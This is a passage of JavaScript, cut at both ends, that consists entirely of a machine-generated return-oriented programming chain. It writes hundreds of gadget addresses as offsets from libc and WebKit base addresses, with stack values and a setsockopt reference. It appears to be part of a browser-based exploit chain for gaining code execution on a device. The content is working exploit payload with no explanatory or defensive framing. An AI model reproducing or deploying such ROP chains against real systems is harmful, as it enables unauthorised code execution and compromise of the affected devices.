libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+287664, 
libc_base+811575, 
ropchain+275408, 
libc_base+793877, 
ropchain+292872, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967032, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+292976, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+292992, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+293144, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+293176, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+293160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+293128, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+293272, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+293256, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([65535, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+293384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+5202439, 
libc_base+793877, 
ropchain+293528, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+293544, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+293512, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+293664, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+293680, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+293648, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+293776, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+293792, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+293904, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+293888, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+293992, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+293976, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+294088, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+294104, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+294216, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+294200, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
setsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+295544, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+295616, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+295680, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+792472, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967168, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+792472, 
libc_base+793877, 
libc_base+793877 
]);
db([4294967176, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+295864, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967168, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+295960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+296016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+296096, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([13, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+296200, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+296216, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+296304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+296360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+296432, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967184, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+792472, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+792472, 
libc_base+793877, 
libc_base+793877 
]);
db([4294967200, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+296616, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4294967295, 4294967295]); 
set_gadget(libc_base+788575,); 
db([7, 0]); 
set_gadgets([
libc_base+582033, 
libc_base+793877, 
ropchain+296704, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967208, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+792472, 
libc_base+248252, 
libc_base+793877 
]);
db([4294967216, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+792472, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967224, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+792472, 
libc_base+792472, 
libc_base+793877 
]);
db([4294967232, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967240, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+296992, 
webkit_base+7438103, 
libc_base+792472 
]);
db([125, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+759626, 
libc_base+792472, 
webkit_base+1838146, 
libc_base+793877 
]);
db([4294967248, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+792472, 
webkit_base+11349202, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+792472, 
libc_base+811575, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+297256, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+793877, 
ropchain+297312, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967286, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+297432, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967168, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+297480, 
webkit_base+7438103, 
webkit_base+11924577 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+297624, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+297600, 
webkit_base+7438103, 
webkit_base+2810902, 
libc_base+793877, 
ropchain+297616, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877, 
ropchain+297712, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967286, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+297816, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+297848, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+297832, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+298008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+297976, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+297960, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+298064, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+298168, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+298200, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+298184, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+298360, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+298328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+298312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+298432, 
webkit_base+7438103, 
libc_base+792472 
]);
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+298592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+298624, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+298608, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+298576, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+298784, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+298752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+298736, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+298888, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+298872, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+298968, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+299072, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+299088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+299192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+299176, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+299296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+299280, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+562536, 
libc_base+793877, 
ropchain+299352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877, 
ropchain+299448, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967286, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+299528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+299584, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([2, 0]); 
set_gadget(libc_base+788575,); 
db([2, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+299736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+299792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+299912, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+299944, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+299928, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+300088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+300056, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+300072, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+300168, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+300272, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+300288, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+300392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+300376, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+300448, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+300576, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+300560, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+300672, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+300688, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+300800, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+300784, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+300872, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+300936, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+301008, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+301144, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+301128, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+301224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+301272, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+301376, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+301392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+301536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+301504, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+301520, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+301616, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([128, 0]); 
set_gadget(libc_base+788575,); 
db([128, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+301744, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+301728, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+301872, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+302024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+302040, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+302008, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1506828, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+302160, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+302312, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+302328, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+302296, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+302432, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+302448, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
